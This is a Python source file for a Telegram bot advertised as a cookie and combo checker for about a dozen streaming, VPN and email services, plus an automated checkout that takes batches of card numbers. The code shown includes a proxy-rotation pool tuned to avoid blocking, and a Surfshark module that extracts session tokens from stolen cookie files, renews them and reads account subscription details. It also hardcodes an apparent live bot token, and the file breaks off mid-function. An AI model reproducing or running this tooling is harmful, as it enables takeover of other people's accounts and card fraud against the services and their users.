# -*- coding: utf-8 -*-
"""
combined_bot.py — Unified Telegram Cookie/Combo Checker + Whop Autocheckout
=============================================================================
Services (12):
  Surfshark · Spotify · JioHotstar · Netflix · Netflix Cap · HBO Max
  · Hotmail · MS FullCap · Crunchyroll · Crunchyroll 2 · ExpressVPN · Prime Video
Commands:
  /start /stats /addpxy /listpxy /checkpxy /clearpyx /diag
  /whop <checkout_url> <card1> ... <card10>

CONFIG — fill TOKEN / OWNER_ID / ADMIN_IDS / GC_STORE_CHAT_ID before running.
"""

# ── stdlib ──────────────────────────────────────────────────────────────────
import os
import re
import io
import sys
import json
import glob
import time
import uuid
import base64
import gzip
import hmac
import string
import hashlib
import secrets
import asyncio
import logging
import tempfile
import zipfile
import shutil
import random
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, List, Tuple, Set, Any
from urllib.parse import urlparse, parse_qs, quote as _quote, unquote as _unquote, urlencode, urljoin
# ── third-party (core) ─────────────────────────────────────────────────────
import requests
requests.packages.urllib3.disable_warnings()
import cloudscraper
try:
    import chrome_compat  # noqa: F401 — registers curl_compat alias
    from paddle_hitter import PaddleHitter
    from epoch_hitter  import EpochHitter
    _PADDLE_EPOCH_OK = True
except Exception as _e:
    logging.warning(f"Paddle/Epoch engines disabled: {_e}")
    PaddleHitter = EpochHitter = None
    _PADDLE_EPOCH_OK = False
import cv2
import numpy as np

try:
    from pyzbar.pyzbar import decode as pyzbar_decode
    _PYZBAR_OK = True
except Exception:
    _PYZBAR_OK = False

from aiogram import Bot, Dispatcher, types, Router, F
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    BufferedInputFile, FSInputFile,
)
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest

# ── optional crypto (ExpressVPN) ───────────────────────────────────────────
try:
    from Crypto.Cipher import AES, PKCS1_v1_5, DES3
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    _PYCRYPTODOME_OK = True
except Exception:
    AES = PKCS1_v1_5 = DES3 = RSA = None
    get_random_bytes = None
    _PYCRYPTODOME_OK = False
    logging.warning("pycryptodome not installed — ExpressVPN checker disabled")

try:
    from asn1crypto import cms, x509, keys
    _ASN1CRYPTO_OK = True
except Exception:
    cms = x509 = keys = None
    _ASN1CRYPTO_OK = False
    logging.warning("asn1crypto not installed — ExpressVPN checker disabled")

# ── optional TLS impersonation (Crunchyroll / Netflix Cap / Whop) ──────────
try:
    from curl_cffi import requests as creq
    from curl_cffi.requests.adapters import Retry as CFFIRetry
    _CURL_CFFI_OK = True
except Exception:
    import requests as creq
    CFFIRetry = None
    _CURL_CFFI_OK = False

# ── optional YAML (Prime Video config) ─────────────────────────────────────
try:
    import yaml
    _YAML_OK = True
except Exception:
    yaml = None
    _YAML_OK = False

# ── optional requests Retry adapter (Crunchyroll) ──────────────────────────
from requests.adapters import HTTPAdapter
try:
    from urllib3.util.retry import Retry as Urllib3Retry
    _URLLIB3_RETRY_OK = True
except Exception:
    Urllib3Retry = None
    _URLLIB3_RETRY_OK = False


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                         GLOBAL CONFIGURATION                            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

TOKEN            = "8823097674:AAFDQagHq9qhPO9pQ-CF7kck0_bfETAlK4A"
OWNER_ID         = 8801932812
ADMIN_IDS        = [8801932812]
GC_STORE_CHAT_ID = -1004337097449

MAX_WORKERS      = 20
REQUEST_TIMEOUT  = 20
MAX_FILE_SIZE    = 50 * 1024 * 1024

# ── proxy validation config ────────────────────────────────────────────────
PROXY_VALIDATE_URL          = "https://api.ipify.org?format=json"
PROXY_VALIDATE_TIMEOUT      = 10
PROXY_VALIDATE_CONCURRENCY  = 10
PROXY_MAX_LATENCY_MS        = 5000
PROXY_AUTO_DEAD_FAILS       = 5
PROXY_PREFLIGHT_TIMEOUT     = 8
PROXY_CHECK_COUNTRY_API     = "https://ipapi.co/{ip}/country_name/"

# ── per-service target domains for proxy pre-flight ────────────────────────
# When a proxy is picked for a service, we test its reachability against the
# service's *target* domain (not just api.ipify.org). CF/ISP-blocked proxies
# fail this and get skipped before wasting a combo.
SERVICE_TARGET_DOMAINS = {
    "surfshark":    "https://api.surfshark.com/",
    "spotify":      "https://www.spotify.com/",
    "hotstar":      "https://www.hotstar.com/",
    "netflix":      "https://www.netflix.com/",
    "netflixcap":   "https://www.netflix.com/",
    "hbomax":       "https://auth.hbomax.com/",
    "hotmail":      "https://login.live.com/",
    "msfullcap":    "https://login.live.com/",
    "crunchyroll":  "https://beta-api.crunchyroll.com/",
    "crunchyroll2": "https://sso.crunchyroll.com/",
    "expressvpn":   "https://www.expressapisv2.net/",
    "primevideo":   "https://www.primevideo.com/",
    "whop":         "https://whop.com/",
    "ady":          "https://checkoutshopper-live.adyen.com/",
    "xbox":         "https://login.live.com/",
    "xboxcap":      "https://login.live.com/",
    "dazn":         "https://www.dazn.com/",
    "deezer":       "https://www.deezer.com/",
    "disney":       "https://disney.api.edge.bamgrid.com/",
    "roblox":       "https://www.roblox.com/",
    "paddle":       "https://checkout-service.paddle.com/",
    "epoch":        "https://billing.epoch.com/",
}

# ── output folders (per service) ─────────────────────────────────────────
_DIRS = [
    "ss_premium", "ss_free", "ss_dead",
    "sp_premium", "sp_free", "sp_dead",
    "hs_live", "hs_device", "hs_free", "hs_invalid",
    "nf_premium", "nf_free", "nf_dead", "nf_tokens",
    "nfc_hit", "nfc_free", "nfc_bad", "nfc_custom",
    "hbo_live", "hbo_dead",
    "hm_hit", "hm_dead",
    "msfc_hit", "msfc_bad", "msfc_2fa",
    "cr_hit", "cr_custom", "cr_fail", "cr_retry",
    "cr2_valid", "cr2_premium", "cr2_free", "cr2_invalid", "cr2_mfa",
    "ex_premium", "ex_free", "ex_dead", "ex_retry",
    "pv_paid", "pv_free", "pv_unknown", "pv_duplicate", "pv_failed", "pv_error",
]
for _d in _DIRS:
    os.makedirs(_d, exist_ok=True)

NF_VAULT_DIR        = "nf_vault"
os.makedirs(NF_VAULT_DIR, exist_ok=True)

HS_VAULT_DIR       = "hs_vault"
HS_VAULT_USAGE_FILE = "hs_vault_usage.json"
HS_VAULT_STATS_FILE = "hs_vault_stats.json"
HS_VAULT_MAX_USES   = 3
os.makedirs(HS_VAULT_DIR, exist_ok=True)

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                         ANIMATED EMOJI HELPERS                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def _e(eid: str, fb: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

E_CHECK   = _e("6100541628496219252", "✅")
E_FILE    = _e("5888646724003566593", "📄")
E_COUNT   = _e("5226929552319594190", "🔢")
E_ZIP     = _e("6089423023318766264", "📦")
E_STATS   = _e("6093382540784046658", "📊")
E_TRASH   = _e("5235927882466876283", "🗑")
E_HELP    = _e("5298955887585538580", "❓")
E_EMPTY   = _e("5287533898803211359", "📭")
E_GEAR    = _e("6102850718878665815", "⚙️")
E_DOWN    = _e("6102486063270333582", "⬇️")
E_FOLDER  = _e("5298853345241358103", "📂")
E_CLOCK   = _e("6010111371251815589", "⏳")
E_PLAN    = _e("6104891515539033627", "🎫")
E_DATE    = _e("5274055917766202507", "📅")
E_EMAIL   = _e("6188374109131377154", "📧")
E_COUNTRY = _e("6071225946965284290", "🌍")
E_ID      = _e("5278510335723066039", "🆔")
E_UPLOAD  = _e("6071202170026332329", "📤")
E_NO      = _e("6093778090092139204", "⛔")

SS_PREMIUM = _e("6070856180345868814", "🟢")
SS_FREE    = _e("5123344136665039833", "⚪")
SS_DEAD    = _e("6100515480735321747", "❌")
SS_REVIVED = _e("6102394417258171824", "🔄")
SS_PRICE   = _e("5310278924616356636", "💰")
SS_SHIELD  = _e("6086672466132865380", "🛡")
SS_LOGIN   = _e("6102394417258171824", "🔑")

SP_PREMIUM = _e("5296372434692234934", "💚")
SP_FREE    = _e("5341371571556612986", "🩶")
SP_DEAD    = _e("5343978724079467577", "💀")
SP_MUSIC   = _e("5278712667337409114", "🎵")
SP_TV      = _e("5231250323779116601", "📺")
SP_BOLT    = _e("5303040337059543238", "⚡")
SP_SPARK   = _e("5343584360182349563", "✨")
SP_SEARCH  = _e("5318972874726339331", "🔍")
SP_CODE    = _e("5305757775752620395", "🔐")

HS_LIVE    = _e("6070856180345868814", "🟢")
HS_DEVICE  = _e("6102394417258171824", "⚠️")
HS_FREE    = _e("5123344136665039833", "⚪")
HS_INVALID = _e("6100515480735321747", "❌")
HS_USER    = _e("4904848288345228262", "👤")
HS_PHONE   = _e("5800685308450182011", "📱")
HS_TV      = _e("5231250323779116601", "📺")
HS_TARGET  = _e("5310278924616356636", "🎯")
HS_SHIELD  = _e("6086672466132865380", "🛡")

HBO_LIVE = _e("6070856180345868814", "🟢")
HBO_DEAD = _e("6100515480735321747", "❌")
HBO_TV   = _e("5332726004253212527", "📺")
HBO_ICON = _e("4986012398461649574", "🎬")

HM_HIT     = _e("6100541628496219252", "📧")
HM_LINKED  = _e("6071202170026332329", "🔗")
MSFC_HIT   = _e("5310278924616356636", "💰")
MSFC_CARD  = _e("5296372434692234934", "💳")
MSFC_2FA   = _e("6102394417258171824", "🔒")

CR_ICON    = _e("5278712667337409114", "🍥")
CR_PREMIUM = _e("5296372434692234934", "💚")
CR_FREE    = _e("5341371571556612986", "🩶")
CR_FAIL    = _e("5343978724079467577", "💀")
CR_RETRY   = _e("5303040337059543238", "⚡")
CR_TOKEN   = _e("5305757775752620395", "🔐")

EX_ROCKET  = _e("6102850718878665815", "🚀")
EX_PREMIUM = _e("6070856180345868814", "🟢")
EX_FREE    = _e("5123344136665039833", "⚪")
EX_DEAD    = _e("6100515480735321747", "❌")
EX_SHIELD  = _e("6086672466132865380", "🛡")
EX_KEY     = _e("6102394417258171824", "🔑")

# Prime Video
PV_ICON    = _e("4986012398461649574", "📺")
PV_PAID    = _e("6070856180345868814", "🟢")
PV_FREE    = _e("5123344136665039833", "⚪")
PV_UNKNOWN = _e("6102394417258171824", "⚠️")
PV_DUP     = _e("5303040337059543238", "🔁")
PV_FAIL    = _e("6100515480735321747", "❌")
PV_ERR     = _e("5343978724079467577", "💀")

# Whop
WH_ICON    = _e("5310278924616356636", "💰")
WH_OK      = _e("6070856180345868814", "🟢")
WH_FAIL    = _e("6100515480735321747", "❌")
WH_CARD    = _e("5296372434692234934", "💳")
WH_CART    = _e("6071202170026332329", "🛒")

E_WRENCH   = _e("4904936030232117798", "🔧")
E_CAMERA   = _e("5373056919688731596", "📸")
E_PARTY    = _e("5801170880272797821", "🎉")

_BOLD_MAP: dict = {}
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _BOLD_MAP[_c] = chr(0x1D5D4 + _i)
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _BOLD_MAP[_c] = chr(0x1D5EE + _i)
for _i, _c in enumerate("0123456789"):
    _BOLD_MAP[_c] = chr(0x1D7EC + _i)

def bold(text: str) -> str:
    return "".join(_BOLD_MAP.get(c, c) for c in text)


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    ENHANCED PROXY MANAGER (WITH PRE-FLIGHT)             ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class ProxyManager:
    """
    Persistent pool with mandatory live validation + per-service pre-flight.

    - add_proxy: format → ipify connectivity → latency → country → save
    - get_random_proxy_for(service): filtered by last-known reachability
      to that service's target domain
    - recheck_all_async: re-test every proxy against ipify; drop dead ones
    """

    def __init__(self, persist_file: str = "proxies.json"):
        self.persist_file = persist_file
        self.proxies: Dict[str, Dict] = {}
        # cache: proxy -> {domain: {"ok": bool, "ts": epoch}}
        self.preflight_cache: Dict[str, Dict[str, Dict]] = {}
        self.load_proxies()

    # ── persistence ─────────────────────────────────────────────────────
    def load_proxies(self) -> None:
        if os.path.exists(self.persist_file):
            try:
                with open(self.persist_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                raw = data.get("proxies", {})
                if isinstance(raw, list):
                    for p in raw:
                        self.proxies[p] = self._empty_meta()
                elif isinstance(raw, dict):
                    for p, meta in raw.items():
                        merged = self._empty_meta()
                        if isinstance(meta, dict):
                            merged.update(meta)
                        self.proxies[p] = merged
                self.preflight_cache = data.get("preflight", {}) or {}
                logger.info(f"Loaded {len(self.proxies)} proxies")
            except (json.JSONDecodeError, IOError) as e:
                logger.error(f"Failed to load proxies: {e}")
                self.proxies = {}
                self.preflight_cache = {}

    def save_proxies(self) -> None:
        try:
            with open(self.persist_file, "w", encoding="utf-8") as f:
                json.dump({
                    "proxies": self.proxies,
                    "preflight": self.preflight_cache,
                    "updated": datetime.now().isoformat(),
                }, f, indent=2)
        except IOError as e:
            logger.error(f"Failed to save proxies: {e}")

    @staticmethod
    def _empty_meta() -> Dict:
        return {
            "latency_ms": None,
            "country":    None,
            "added":      datetime.now().isoformat(),
            "last_check": None,
            "success":    0,
            "fail":       0,
            "status":     "alive",
        }

    # ── format validation ───────────────────────────────────────────────
    @staticmethod
    def _validate_proxy_format(proxy: str) -> bool:
        patterns = [
            r'^(socks5|socks4|http|https)://[^:]+:[^@]+@[^:]+:\d+$',
            r'^(socks5|socks4|http|https)://[^:]+:\d+$',
        ]
        return any(re.match(p, proxy) for p in patterns)

    # ── sync tests (run inside executor) ────────────────────────────────
    @staticmethod
    def _test_proxy_sync(proxy: str, timeout: int = PROXY_VALIDATE_TIMEOUT) -> Tuple[bool, Optional[float], Optional[str], str]:
        proxies = {"http": proxy, "https": proxy}
        start = time.time()
        try:
            r = requests.get(
                PROXY_VALIDATE_URL, proxies=proxies, timeout=timeout, verify=False,
                headers={"User-Agent": "Mozilla/5.0"},
            )
            latency_ms = (time.time() - start) * 1000
            if r.status_code != 200:
                return False, latency_ms, None, f"http_{r.status_code}"
            try:
                ip = r.json().get("ip")
            except Exception:
                ip = r.text.strip()
            if not ip:
                return False, latency_ms, None, "no_ip"
            if latency_ms > PROXY_MAX_LATENCY_MS:
                return False, latency_ms, ip, f"slow_{int(latency_ms)}ms"
            return True, latency_ms, ip, "ok"
        except requests.exceptions.ProxyError:
            return False, None, None, "proxy_error"
        except requests.exceptions.ConnectTimeout:
            return False, None, None, "connect_timeout"
        except requests.exceptions.ReadTimeout:
            return False, None, None, "read_timeout"
        except requests.exceptions.SSLError:
            return False, None, None, "ssl_error"
        except Exception as e:
            return False, None, None, f"error_{type(e).__name__}"

    @staticmethod
    def _lookup_country_sync(ip: str) -> Optional[str]:
        try:
            r = requests.get(PROXY_CHECK_COUNTRY_API.format(ip=ip), timeout=5,
                             headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                t = r.text.strip()
                if t and not t.startswith("<"):
                    return t[:40]
        except Exception:
            pass
        return None

    @staticmethod
    def _preflight_sync(proxy: str, target_url: str, timeout: int = PROXY_PREFLIGHT_TIMEOUT) -> Tuple[bool, Optional[float], str]:
        """Test if proxy can actually reach target_url. Returns (ok, latency_ms, reason)."""
        proxies = {"http": proxy, "https": proxy}
        start = time.time()
        try:
            r = requests.get(
                target_url, proxies=proxies, timeout=timeout, verify=False,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                allow_redirects=True,
            )
            latency_ms = (time.time() - start) * 1000
            # Any response < 500 with acceptable latency = reachable
            if r.status_code < 500 and latency_ms < 4000:
                return True, latency_ms, "ok"
            return False, latency_ms, f"http_{r.status_code}"
        except requests.exceptions.ProxyError:
            return False, None, "proxy_error"
        except requests.exceptions.ConnectTimeout:
            return False, None, "connect_timeout"
        except requests.exceptions.ReadTimeout:
            return False, None, "read_timeout"
        except requests.exceptions.SSLError:
            return False, None, "ssl_error"
        except Exception as e:
            return False, None, f"error_{type(e).__name__}"

    # ── async wrappers ──────────────────────────────────────────────────
    async def _validate_one_async(self, proxy: str, executor: ThreadPoolExecutor) -> Tuple[str, bool, Dict, str]:
        loop = asyncio.get_event_loop()
        ok, latency_ms, ip, reason = await loop.run_in_executor(executor, self._test_proxy_sync, proxy)
        if not ok:
            return proxy, False, {}, reason
        country = None
        if ip:
            country = await loop.run_in_executor(executor, self._lookup_country_sync, ip)
        meta = {
            "latency_ms": int(latency_ms) if latency_ms else None,
            "country":    country,
            "added":      datetime.now().isoformat(),
            "last_check": datetime.now().isoformat(),
            "success":    0, "fail": 0, "status": "alive",
        }
        return proxy, True, meta, "ok"

    async def _validate_batch_async(self, proxies: List[str]) -> List[Tuple[str, bool, Dict, str]]:
        sem = asyncio.Semaphore(PROXY_VALIDATE_CONCURRENCY)
        executor = ThreadPoolExecutor(max_workers=PROXY_VALIDATE_CONCURRENCY * 2)

        async def guarded(p):
            async with sem:
                return await self._validate_one_async(p, executor)

        try:
            results = await asyncio.gather(*(guarded(p) for p in proxies), return_exceptions=True)
        finally:
            executor.shutdown(wait=False)

        out = []
        for i, r in enumerate(results):
            if isinstance(r, Exception):
                out.append((proxies[i], False, {}, f"exception_{type(r).__name__}"))
            else:
                out.append(r)
        return out

    async def preflight_async(self, proxy: str, service: str) -> Tuple[bool, str]:
        """Test if proxy can reach service's target domain. Caches result for 10 min."""
        target = SERVICE_TARGET_DOMAINS.get(service)
        if not target:
            return True, "no_target"
        # Check cache
        cache = self.preflight_cache.setdefault(proxy, {})
        cached = cache.get(service)
        if cached and (time.time() - cached.get("ts", 0)) < 600:
            return cached.get("ok", False), "cached"
        # Run test
        executor = ThreadPoolExecutor(max_workers=1)
        try:
            loop = asyncio.get_event_loop()
            ok, latency_ms, reason = await loop.run_in_executor(
                executor, self._preflight_sync, proxy, target
            )
        finally:
            executor.shutdown(wait=False)
        cache[service] = {"ok": ok, "ts": time.time(), "latency_ms": latency_ms, "reason": reason}
        return ok, reason

    # ── public add API ──────────────────────────────────────────────────
    async def add_proxy_async(self, proxy: str) -> Tuple[bool, str]:
        proxy = (proxy or "").strip()
        if not proxy:
            return False, "empty"
        if not self._validate_proxy_format(proxy):
            return False, "invalid_format"
        if proxy in self.proxies:
            return False, "duplicate"

        executor = ThreadPoolExecutor(max_workers=2)
        try:
            loop = asyncio.get_event_loop()
            ok, latency_ms, ip, reason = await loop.run_in_executor(
                executor, self._test_proxy_sync, proxy
            )
            if not ok:
                return False, f"dead:{reason}"
            country = None
            if ip:
                country = await loop.run_in_executor(executor, self._lookup_country_sync, ip)
        finally:
            executor.shutdown(wait=False)

        self.proxies[proxy] = {
            "latency_ms": int(latency_ms) if latency_ms else None,
            "country":    country,
            "added":      datetime.now().isoformat(),
            "last_check": datetime.now().isoformat(),
            "success":    0, "fail": 0, "status": "alive",
        }
        self.save_proxies()
        return True, "ok"

    async def add_proxies_bulk_async(self, proxy_list: List[str]) -> Dict:
        added, invalid_format, dead, duplicate = [], [], [], []
        to_validate: List[str] = []
        for raw in proxy_list:
            p = (raw or "").strip()
            if not p:
                continue
            if not self._validate_proxy_format(p):
                invalid_format.append(p)
                continue
            if p in self.proxies or p in to_validate:
                duplicate.append(p)
                continue
            to_validate.append(p)

        if to_validate:
            results = await self._validate_batch_async(to_validate)
            for proxy, ok, meta, reason in results:
                if ok:
                    self.proxies[proxy] = meta
                    added.append(proxy)
                else:
                    dead.append((proxy, reason))
        if added:
            self.save_proxies()

        return {
            "added": added, "invalid_format": invalid_format,
            "dead": dead, "duplicate": duplicate,
        }

    def remove_proxy(self, proxy: str) -> bool:
        if proxy in self.proxies:
            del self.proxies[proxy]
            self.preflight_cache.pop(proxy, None)
            self.save_proxies()
            return True
        return False

    def clear_proxies(self) -> None:
        self.proxies.clear()
        self.preflight_cache.clear()
        self.save_proxies()

    # ── runtime selection ───────────────────────────────────────────────
    def get_random_proxy(self) -> Optional[str]:
        alive = [p for p, m in self.proxies.items() if m.get("status") != "dead"]
        if not alive:
            for m in self.proxies.values():
                m["status"] = "alive"; m["fail"] = 0
            alive = list(self.proxies.keys())
            if not alive:
                return None

        weighted = []
        for p in alive:
            m = self.proxies[p]
            succ = m.get("success", 0) + 1
            fail = m.get("fail", 0)
            lat  = max((m.get("latency_ms") or 1000) / 1000.0, 0.05)
            weight = (succ / (succ + fail + 1)) / lat
            weighted.append((p, max(weight, 0.001)))

        total = sum(w for _, w in weighted)
        r = random.uniform(0, total)
        acc = 0.0
        for p, w in weighted:
            acc += w
            if r <= acc:
                return p
        return weighted[-1][0]

    async def get_verified_proxy_for(self, service: str, max_tries: int = 3) -> Optional[str]:
        """Pick a proxy that passes pre-flight for this service. Returns None if none pass."""
        for _ in range(max_tries):
            proxy = self.get_random_proxy()
            if not proxy:
                return None
            ok, _ = await self.preflight_async(proxy, service)
            if ok:
                return proxy
            # Mark as failed for this domain so next try picks a different one
            self.mark_failed(proxy)
        return None

    def mark_failed(self, proxy: str) -> None:
        if not proxy or proxy not in self.proxies:
            return
        m = self.proxies[proxy]
        m["fail"] = m.get("fail", 0) + 1
        if m["fail"] >= PROXY_AUTO_DEAD_FAILS:
            m["status"] = "dead"
            logger.warning(f"Proxy auto-marked dead after {m['fail']} fails: {proxy[:40]}...")
        self.save_proxies()

    def mark_success(self, proxy: str) -> None:
        if not proxy or proxy not in self.proxies:
            return
        m = self.proxies[proxy]
        m["success"] = m.get("success", 0) + 1
        if m.get("status") == "dead" and m["success"] >= 3:
            m["status"] = "alive"
        if m["success"] % 20 == 0:
            self.save_proxies()

    # ── maintenance ─────────────────────────────────────────────────────
    async def recheck_all_async(self) -> Dict:
        all_p = list(self.proxies.keys())
        if not all_p:
            return {"checked": 0, "alive": 0, "dead": 0}
        results = await self._validate_batch_async(all_p)
        alive = dead = 0
        for proxy, ok, meta, reason in results:
            m = self.proxies.get(proxy)
            if not m:
                continue
            m["last_check"] = datetime.now().isoformat()
            if ok:
                m["latency_ms"] = meta.get("latency_ms")
                m["country"]    = meta.get("country") or m.get("country")
                m["status"]     = "alive"
                alive += 1
            else:
                m["status"] = "dead"
                m["fail"]   = m.get("fail", 0) + 1
                dead += 1
        self.save_proxies()
        return {"checked": len(results), "alive": alive, "dead": dead}

    def get_stats(self) -> Dict[str, int]:
        total = len(self.proxies)
        dead  = sum(1 for m in self.proxies.values() if m.get("status") == "dead")
        return {"total": total, "failed": dead, "available": total - dead}

    def list_masked(self, limit: int = 20) -> List[Dict]:
        out = []
        for p, m in list(self.proxies.items())[:limit]:
            masked = re.sub(r':[^@]+@', ':***@', p)
            out.append({
                "proxy":      masked,
                "latency_ms": m.get("latency_ms"),
                "country":    m.get("country") or "?",
                "status":     m.get("status", "?"),
                "success":    m.get("success", 0),
                "fail":       m.get("fail", 0),
            })
        return out


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    SHARED UTILITIES                                     ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def _pbar(done: int, total: int, width: int = 12) -> str:
    filled = int(width * done / total) if total else 0
    return "▓" * filled + "░" * (width - filled)


async def safe_edit(msg, text: str, markup=None) -> None:
    kwargs = {"text": text, "parse_mode": "HTML"}
    if markup:
        kwargs["reply_markup"] = markup
    try:
        await msg.edit_text(**kwargs)
    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        try:
            await msg.edit_text(**kwargs)
        except Exception:
            pass
    except TelegramBadRequest as e:
        if "Message is not modified" not in str(e):
            logger.warning(f"BadRequest: {e}")
    except Exception as e:
        logger.warning(f"safe_edit: {e}")


def extract_zip_cookies(zip_path: str, prefix: str = "cookie") -> list:
    files = []
    tmp   = tempfile.gettempdir()
    try:
        with zipfile.ZipFile(zip_path, "r") as zf:
            for name in zf.namelist():
                if name.endswith("/") or name.startswith(("__MACOSX", ".")):
                    continue
                if name.lower().endswith((".txt", ".json")):
                    content  = zf.read(name).decode("utf-8", errors="ignore")
                    out_path = os.path.join(
                        tmp,
                        f"{prefix}_{int(time.time())}_{abs(hash(name))}_{name.replace('/', '_')}",
                    )
                    with open(out_path, "w", encoding="utf-8") as f:
                        f.write(content)
                    files.append(out_path)
    except Exception as e:
        logger.error(f"ZIP extract error: {e}")
    return files


# ▼ CHUNK 1 END — PASTE CHUNK 2 BELOW THIS LINE ▼
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║              SURFSHARK CHECKER                                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

SS_UA_CHECK = "SurfsharkAndroid/3.27.0 com.surfshark.vpnclient.android/release/playStore/310041035 device/firewall"
SS_UA_LOGIN = "Surfshark/4.1.2 (com.surfshark.vpnclient.ios; build:4; iOS 26.1.0) Alamofire/5.10.2 device/mobile"


def ss_extract_token(content: str, token_name: str) -> Optional[str]:
    for pattern in [
        rf'{token_name}[=\s]+([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
        rf'"{token_name}"\s*:\s*"([^"]+)"',
        rf'{token_name}\s+([eyJ][A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
    ]:
        m = re.search(pattern, content)
        if m and m.group(1).count(".") >= 2:
            return m.group(1)
    for line in content.split("\n"):
        if token_name not in line:
            continue
        clean = line[10:] if line.startswith("#HttpOnly_") else line
        if clean.startswith("#") and not line.startswith("#HttpOnly_"):
            continue
        parts = re.split(r"\t+|\s+", clean)
        for i, part in enumerate(parts):
            if part == token_name and i + 1 < len(parts):
                val = parts[i + 1].strip()
                if val and not val.startswith("#"):
                    if val.count(".") >= 2:
                        return val
                    m = re.search(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", val)
                    if m:
                        return m.group(0)
    return None


def ss_revive_token(ssrtk: str) -> Optional[Dict]:
    if not ssrtk:
        return None
    try:
        resp = requests.post(
            "https://api.surfshark.com/v1/auth/renew",
            json={},
            headers={
                "Content-Type":  "application/json;charset=utf-8",
                "Accept":        "application/json",
                "User-Agent":    SS_UA_LOGIN,
                "Authorization": f"Bearer {ssrtk}",
            },
            timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            new_sstk = data.get("token")
            if new_sstk:
                return {"sstk": new_sstk, "ssrtk": data.get("renewToken", ssrtk)}
    except Exception:
        pass
    return None


def ss_get_account_info(sstk: str) -> Optional[Dict]:
    headers = {
        "Accept": "application/json", "Accept-Encoding": "gzip",
        "Cache-Control": "no-cache", "Connection": "Keep-Alive",
        "Host": "api.surfshark.com", "User-Agent": SS_UA_CHECK,
        "Authorization": f"Bearer {sstk}",
    }
    results = {}
    try:
        r = requests.get("https://api.surfshark.com/v2/account/users/me",
                         headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code == 200:
            results["user"] = r.json()
        elif r.status_code in (401, 403):
            return None
    except Exception:
        pass
    try:
        r = requests.get("https://api.surfshark.com/v1/payment/subscriptions/current",
                         headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code == 200:
            results["sub"] = r.json()
        elif r.status_code in (401, 403):
            return None
    except Exception:
        pass
    return results if results.get("user") else None


def ss_parse_sub(sub_data: Dict) -> Dict:
    if not sub_data:
        return {"plan": "Unknown", "status": "Unknown", "expires_at": "Unknown",
                "price": "Unknown", "country": "Unknown", "region": "Unknown"}
    plan_raw = sub_data.get("name") or sub_data.get("plan", "Unknown")
    if isinstance(plan_raw, dict):
        plan_raw = plan_raw.get("name", str(plan_raw))
    plan = str(plan_raw)
    for pfx in ["Surfshark - ", "Surfshark-"]:
        if plan.startswith(pfx):
            plan = plan[len(pfx):]
    price = "Unknown"
    p = sub_data.get("price", {})
    if isinstance(p, dict) and "amount" in p:
        amount   = p["amount"] / 100
        cur      = p.get("currency", {})
        cur_code = cur.get("code", "USD") if isinstance(cur, dict) else "USD"
        price    = f"${amount:.2f} {cur_code}"
    return {
        "plan":       plan[:50],
        "status":     sub_data.get("status", "Unknown"),
        "expires_at": sub_data.get("expiresAt", "Unknown"),
        "price":      price,
        "region":     sub_data.get("regionName", "Unknown"),
        "country":    sub_data.get("taxCountry", "Unknown"),
    }


def ss_calc_days_left(expires_at: str) -> int:
    try:
        exp_str = expires_at.split("T")[0]
        exp_dt  = datetime.strptime(exp_str, "%Y-%m-%d")
        return max(0, (exp_dt - datetime.now()).days)
    except Exception:
        return 0


def ss_get_subscription_info(sstk: str):
    try:
        resp = requests.get(
            "https://api.surfshark.com/v1/payment/subscriptions/current",
            headers={"Accept": "application/json", "User-Agent": SS_UA_LOGIN,
                     "Authorization": f"Bearer {sstk}"},
            timeout=REQUEST_TIMEOUT, verify=False,
        )
        if resp.status_code == 200:
            data = resp.json()
            if data and "name" in data:
                plan   = data.get("name", "Unknown")
                status = data.get("status", "Unknown").lower()
                is_premium = status in ("active", "active_grace") and "free" not in plan.lower()
                return is_premium, {
                    "plan":       plan,
                    "status":     data.get("status", "Unknown"),
                    "expires_at": data.get("expiresAt", "Unknown"),
                }
            return False, {"error": "No subscription data"}
        if resp.status_code == 204:
            return False, {"error": "No active subscription"}
        return False, {"error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return False, {"error": str(e)[:60]}


def ss_check_one(content: str, filename: str = "") -> Dict:
    sstk  = ss_extract_token(content, "_sstk")
    ssrtk = ss_extract_token(content, "_ssrtk")

    if not ssrtk:
        if not sstk:
            return {"status": "DEAD", "reason": "No _sstk or _ssrtk found", "filename": filename, "content": content}
        return {"status": "DEAD", "reason": "No _ssrtk found — cannot revive", "filename": filename, "content": content}

    revived_tokens = ss_revive_token(ssrtk)
    if not revived_tokens:
        return {"status": "DEAD", "reason": "Token revive failed", "filename": filename, "content": content}

